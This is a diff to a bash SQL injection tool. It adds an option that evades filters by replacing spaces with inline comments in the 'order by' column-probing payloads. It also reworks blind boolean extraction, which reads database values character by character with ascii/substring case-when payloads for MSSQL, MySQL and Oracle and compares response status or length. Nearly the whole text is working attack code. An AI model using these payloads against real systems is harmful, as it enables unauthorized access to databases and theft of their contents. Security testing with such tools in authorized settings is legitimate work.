@@ -218,6 +218,8 @@ if [ true = "$O" ] ; then #uri unicode encoding
 	uriinputencode="1$quote order by 9659$end"
 	uriunicode
 	badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+elif [ true = "$Y" ] ; then #Inline SQL comment space
+	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote/*d*/order/*d*/by/**/9659$end"`
 else
 	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by 9659$end"`
 fi
@@ -241,6 +243,8 @@ if [ true = "$O" ] ; then #uri unicode encoding
 	uriinputencode="1$quote order by 1$end"
 	uriunicode
 	badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+elif [ true = "$Y" ] ; then #Inline SQL comment space
+	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote/*d*/order/*d*/by/**/1$end"`
 else
 	badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by 1$end"`
 fi
@@ -270,6 +274,9 @@ while [[ $count -lt $columns ]] ; do
 			uriinputencode="1$quote order by $count$end"
 			uriunicode
 			badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+		elif [ true = "$Y" ] ; then #Inline SQL comment space
+			badparams=`echo "$cleanoutput" | replace "$payload" "1$quote/*d*/order/*d*/by/**/$count$end"`
+
 		else
 			badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by $count$end"`
 		fi
@@ -302,6 +309,8 @@ while [[ $count -lt $columns ]] ; do
 		uriinputencode="1$quote order by $count$end"
 		uriunicode
 		badparams=`echo "$cleanoutput" | replace "$payload" "$uriinputencoded"`
+	elif [ true = "$Y" ] ; then #Inline SQL comment space
+		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote/*d*/order/*d*/by/**/$count$end"`
 	else
 		badparams=`echo "$cleanoutput" | replace "$payload" "1$quote order by $count$end"`
 	fi
@@ -2675,9 +2684,11 @@ cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
 				dc=$((binrange/itwo))
 
 				if [[ $dbms == "mssql" ]] ; then                            
-					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring((select $findme),$oflag,1)) >$asciinumber) then 789 else 0 end)$end"`
+					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring((select $findme),$oflag,1)) > $asciinumber) then 789 else 0 end)$end"`
+					#echo "DEBUG! findme: $findme oflag: $oflag asciinumber: $asciinumber" 
 				elif [[ $dbms == "mysql" ]] ; then
 					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring($findme,$oflag,1)) > $asciinumber) then 789 else 0 end)$end"`
+					#echo "DEBUG! findme: $findme oflag: $oflag asciinumber: $asciinumber"
 				elif [[ $dbms == "oracle" ]] ; then
 					badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when ascii(substr(($findme),$oflag,1)) > $asciinumber then 789 else 0 end$end"`
 				else
@@ -2698,26 +2709,44 @@ cat ./payloads/thingstoextractwhenblind.$dbms.txt | while read findme ; do
 				#	echo -n "$output"
 				#	nambuf="$nambuf$output"
 				#if [ true = "$Z" ] ; then echo "DEBUG! MATCH on: $output $request" ;fi
-				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+				#found a bug where data extraction would fail as there was no actual status diff check
+				# this catches situations where true and false response statuses are the same
+				# we use length diffing:
+				if [[ "$status_true" == "$status_false" ]] ; then
 					if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
 						operation="ADD"
-						#echo "value is greater than $asciinumber"
+						if [ true = "$Z" ] ; then echo "DEBUG! value is greater than $asciinumber";fi
 					else
 						operation="SUB"
-						#echo "value is less than or equal to $asciinumber"
+						if [ true = "$Z" ] ; then echo "DEBUG! value is less than or equal to $asciinumber"; fi
+					fi
+				fi
+				# this catches situations where true and false response statuses are different
+				# we use status diffing:
+				if [[ "$status_true" != "$status_false" ]] ; then
+					if [[ "$status_true" == "200" ]] ; then
+						operation="ADD"
+						if [ true = "$Z" ] ; then echo "DEBUG! value is greater than $asciinumber";fi
+					else
+						operation="SUB"
+						if [ true = "$Z" ] ; then echo "DEBUG! value is less than or equal to $asciinumber"; fi
 					fi
 				fi
 
 				if [[ "$operation" == "ADD" ]] ; then
 					asciinumber=$((asciinumber+dc))
+					if [ true = "$Z" ] ; then echo "DEBUG! asciinumber is now $asciinumber"; fi
 				elif [[ "$operation" == "SUB" ]] ; then
 					asciinumber=$((asciinumber-dc))
+					if [ true = "$Z" ] ; then echo "DEBUG! asciinumber is now $asciinumber"; fi
 				fi	
 			done #end of inner loop
 			if [[ "$operation" == "ADD" ]] ; then
 				asciinumber=$((asciinumber+1))
+				if [ true = "$Z" ] ; then echo "DEBUG! asciinumber is now $asciinumber"; fi
 			elif [[ "$operation" == "SUB" ]] ; then
 				asciinumber=$((asciinumber))
+				if [ true = "$Z" ] ; then echo "DEBUG! asciinumber is now $asciinumber"; fi
 			fi	
 			#echo "final amount is $asciinumber"
 			decasciiconv
